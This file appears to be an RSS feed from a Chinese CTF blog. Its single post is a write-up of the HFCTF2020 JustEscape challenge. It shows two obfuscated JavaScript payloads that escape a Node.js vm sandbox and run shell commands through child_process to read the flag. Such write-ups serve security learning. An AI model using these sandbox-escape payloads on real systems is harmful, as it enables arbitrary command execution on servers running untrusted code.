@@ -1,0 +1,112 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;js-vm沙箱逃逸&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Wed, 19 Jun 2024 21:35:43 +0800</pubDate>
+        <lastBuildDate>Wed, 19 Jun 2024 21:35:43 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/</guid>
+            <title>[HFCTF2020]JustEscape</title>
+            <link>http://odiws.github.io/2024/06/19/HFCTF2020-JustEscape/</link>
+            <category>buuctf</category>
+            <category>js-vm沙箱逃逸</category>
+            <pubDate>Wed, 19 Jun 2024 21:35:43 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;hfctf2020justescape&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hfctf2020justescape&#34;&gt;#&lt;/a&gt; [HFCTF2020]JustEscape&lt;/h2&gt;
+&lt;p&gt;题目说真的不是 PHP 吗？&lt;br&gt;
+十有八九不是，猜测可能是 Java，结果是 js。&lt;/p&gt;
+&lt;h4 id=&#34;用errorstack看一下报错信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用errorstack看一下报错信息&#34;&gt;#&lt;/a&gt; 用 &lt;code&gt;Error().stack&lt;/code&gt; , 看一下报错信息。&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;报错显示是 &lt;code&gt;vm.js&lt;/code&gt; ，考的 vm 沙箱逃逸。&lt;br&gt;
+POC 参考：&lt;br&gt;
+https://&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;github&lt;/span&gt;.com/patriksimek/vm2/issues/225&lt;br&gt;
+payload1:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(function ()&amp;#123;
+    TypeError[`$&amp;#123;`$&amp;#123;`prototyp`&amp;#125;e`&amp;#125;`][`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`] = f=&amp;gt;f[`$&amp;#123;`$&amp;#123;`constructo`&amp;#125;r`&amp;#125;`](`$&amp;#123;`$&amp;#123;`return proc`&amp;#125;ess`&amp;#125;`)();
+    try&amp;#123;
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    &amp;#125;catch(e)&amp;#123;
+        return e[`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`](()=&amp;gt;&amp;#123;&amp;#125;).mainModule[`$&amp;#123;`$&amp;#123;`requir`&amp;#125;e`&amp;#125;`](`$&amp;#123;`$&amp;#123;`child_proces`&amp;#125;s`&amp;#125;`)[`$&amp;#123;`$&amp;#123;`exe`&amp;#125;cSync`&amp;#125;`](`cat /flag`).toString();
+    &amp;#125;
+&amp;#125;)()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload2：（join 拼接字符串）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(()=&amp;gt;&amp;#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&amp;gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&amp;#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &amp;#125;catch(e)&amp;#123; return e[`a`](()=&amp;gt;&amp;#123;&amp;#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &amp;#125; &amp;#125;)()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获得 flag&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
